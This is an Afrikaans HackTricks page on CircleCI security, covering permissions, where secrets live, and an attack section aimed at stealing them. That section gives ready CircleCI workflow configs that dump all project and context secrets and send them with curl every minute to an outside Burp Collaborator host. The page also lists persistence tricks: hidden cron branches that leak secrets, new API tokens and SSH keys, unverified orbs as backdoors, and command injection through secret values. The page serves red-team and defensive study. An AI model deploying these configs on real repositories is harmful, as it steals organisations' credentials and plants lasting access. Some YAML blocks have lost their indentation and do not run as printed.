# CircleCI Sekuriteit

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Basiese Inligting

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) is 'n Kontinue Integrasie platform waar jy **sjablone kan definieer** wat aandui wat jy wil h√™ dit moet doen met 'n bietjie kode en wanneer dit moet gebeur. Op hierdie manier kan jy toetse outomatiseer of ontplooiings direk **vanaf jou repo meester tak** byvoorbeeld.

## Toestemmings

**CircleCI** **erf die toestemmings** van github en bitbucket rakende die **rekening** wat aanmeld.\
In my toetsing het ek vasgestel dat solank jy **skryftoestemmings oor die repo in github** het, sal jy in staat wees om **die projekinstellings in CircleCI te bestuur** (nuwe ssh-sleutels instel, projek api-sleutels kry, nuwe takke met nuwe CircleCI-opsette skep...).

Tog moet jy 'n **repo-admin** wees om die repo in 'n CircleCI-projek te **omskep**.

## Omgewingsveranderlikes & Geheime

Volgens [**die dokumentasie**](https://circleci.com/docs/2.0/env-vars/) is daar verskillende maniere om waardes in omgewingsveranderlikes binne 'n werkstroom te **laai**.

### Ingeboude omgewingsveranderlikes

Elke houer wat deur CircleCI uitgevoer word, sal altyd [**spesifieke omgewingsveranderlikes h√™ wat in die dokumentasie gedefinieer is**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) soos `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` of `CIRCLE_USERNAME`.

### Duidelike teks

Jy kan hulle in duidelike teks binne 'n **opdrag** verklaar:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Jy kan hulle in duidelike teks binne die **run-omgewing** verklaar:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Jy kan hulle in duidelike teks binne die **bou-werk omgewing** verklaar:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Jy kan hulle in duidelike teks binne die **omgewing van 'n houer** verklaar:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Projek Geheime

Hierdie is **geheime** wat slegs deur die **projek** (deur **enige tak**) **toeganklik** sal wees.\
Jy kan hulle sien **gedeklareer in** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
Die "**Invoer Veranderlikes**" funksionaliteit maak dit moontlik om **veranderlikes van ander projekte** na hierdie een in te voer.
{% endhint %}

### Konteks Geheime

Hierdie is geheime wat **org wyd** is. Standaard sal enige repo in staat wees om enige geheim wat hier gestoor word, **te benader**:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Let wel dat 'n ander groep (in plaas van Alle lede) gekies kan word om slegs toegang tot die geheime aan spesifieke mense te gee.\
Dit is tans een van die beste maniere om die sekuriteit van die geheime te **verhoog**, om nie almal toegang daartoe te gee nie, maar net aan 'n paar mense.
{% endhint %}

## Aanvalle

### Soek Duidelike Teks Geheime

As jy **toegang het tot die VCS** (soos github) kyk na die l√™er `.circleci/config.yml` van **elke repo op elke tak** en **soek** vir potensi√´le **duidelike teks geheime** wat daarin gestoor is.

### Geheime Omgewingsveranderlikes & Konteks enumerasie

Deur die kode te ondersoek, kan jy **al die geheimname** vind wat in elke `.circleci/config.yml` l√™er gebruik word. Jy kan ook die **konteksname** uit daardie l√™ers kry of dit in die webkonsol nakyk: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Exfiltreer Projekgeheime

{% hint style="warning" %}
Om **ALLE** die projek- en konteks **GEHEIME** te **exfiltreer**, hoef jy net **SKRYF** toegang tot **net 1 repo** in die hele github org te h√™ (_en jou rekening moet toegang tot die kontekste h√™, maar standaard kan almal toegang tot elke konteks kry_).
{% endhint %}

{% hint style="danger" %}
Die "**Invoer Veranderlikes**" funksionaliteit maak dit moontlik om **veranderlikes van ander projekte** na hierdie een in te voer. Daarom kan 'n aanvaller **alle projekveranderlikes van al die repos** invoer en dan **almal saam exfiltrate**.
{% endhint %}

Al die projekgeheime word altyd in die omgewing van die take ingestel, dus deur net omgewing te noem en dit in base64 te verduister, sal dit die geheime in die **werkstroom web konsolideer** exfiltrate:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Indien jy **nie toegang tot die webkonsole het** nie, maar jy het **toegang tot die repo** en jy weet dat CircleCI gebruik word, kan jy net **'n werkstroom skep** wat elke minuut **geaktiveer word** en wat die geheime na 'n eksterne adres **onttrek**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Uitlek van Konteksgeheime

Jy moet die **konteksnaam spesifiseer** (dit sal ook die projekgeheime uitlek):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Indien jy **nie toegang tot die webkonsol het nie** maar jy het **toegang tot die repo** en jy weet dat CircleCI gebruik word, kan jy net 'n **werkstroom wysig** wat elke minuut **geaktiveer word** en wat die geheime na 'n eksterne adres **onttrek**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Net die skep van 'n nuwe `.circleci/config.yml` in 'n repo **is nie genoeg om 'n CircleCI-bou te trigger** nie. Jy moet dit **aktiveer as 'n projek in die CircleCI-konsole**.
{% endhint %}

### Ontsnapping na die Wolk

**CircleCI** gee jou die opsie om **jou bouprojekte op hul rekenaars of op jou eie rekenaars** te hardloop.\
Standaard is hul rekenaars gele√´ in GCP, en aanvanklik sal jy nie enige relevante inligting vind nie. Tog, as 'n slagoffer die take in **hul eie rekenaars (moontlik in 'n wolkomgewing)** hardloop, mag jy 'n **wolkmetadatabron met interessante inligting daarop vind**.

Let daarop dat in die vorige voorbeelde alles binne 'n dokkerhouer uitgevoer is, maar jy kan ook vra om 'n VM-rekenaar te laat uitvoer (wat moontlik verskillende wolktoestemmings kan h√™):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Of self 'n docker houer met toegang tot 'n afgele√´ docker-diens:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Volharding

* Dit is moontlik om **gebruikerstokens in CircleCI te skep** om toegang tot die API-eindpunte met die gebruikers se toegang te verkry.
* _https://app.circleci.com/settings/user/tokens_
* Dit is moontlik om **projekstokens te skep** om toegang tot die projek met die toestemmings wat aan die token gegee is, te verkry.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Dit is moontlik om **SSH-sleutels by die projekte toe te voeg**.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Dit is moontlik om **'n cron-werk in 'n verborge tak** in 'n onverwagte projek te skep wat elke dag al die **konteksomgewingsveranderlikes lek**.
* Of selfs 'n tak skep / wysig in 'n bekende werk wat elke dag alle konteks en **projekgeheime lek**.
* As jy 'n github-eienaar is, kan jy **nie-geverifieerde orbs toelaat** en een in 'n werk as **agterdeur** konfigureer
* Jy kan 'n **bevelinspuitingskwesbaarheid** in 'n paar take vind en **bevele inspuit** via 'n **geheim** deur sy waarde te wysig

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
